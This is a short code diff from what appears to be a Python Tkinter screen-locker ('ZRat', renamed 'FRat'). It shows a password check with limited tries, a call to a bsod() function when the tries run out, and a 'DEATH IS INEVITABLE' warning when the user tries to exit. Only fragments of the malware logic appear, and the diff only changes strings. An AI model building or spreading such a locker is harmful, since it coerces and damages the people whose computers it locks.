@@ -63,18 +63,18 @@ def tapp(key):
 def check():
     global count
     if enter_pass.get() == password:
-        messagebox.showinfo("ZRat","UNLOCKED SUCCESSFULLY")
+        messagebox.showinfo("FRat","UNLOCKED SUCCESSFULLY")
         uninstall(wind)
     else:
         count -= 1
         if count == 0:
-            messagebox.showwarning("ZRat", "number of attempts expired\n\n" + warning_text)
+            messagebox.showwarning("FRat", "number of attempts expired\n\n" + warning_text)
             bsod()
         else:
-            messagebox.showwarning("ZRat","Wrong password. Avalible tries: "+ str(count))
+            messagebox.showwarning("FRat","Wrong password. Avalible tries: "+ str(count))
 
 def exiting():
-    messagebox.showwarning("ZRat", "DEATH IS INEVITABLE\n\n" + warning_text)
+    messagebox.showwarning("FRat", "DEATH IS INEVITABLE\n\n" + warning_text)
 
 # Создаем окно
 wind = Tk()
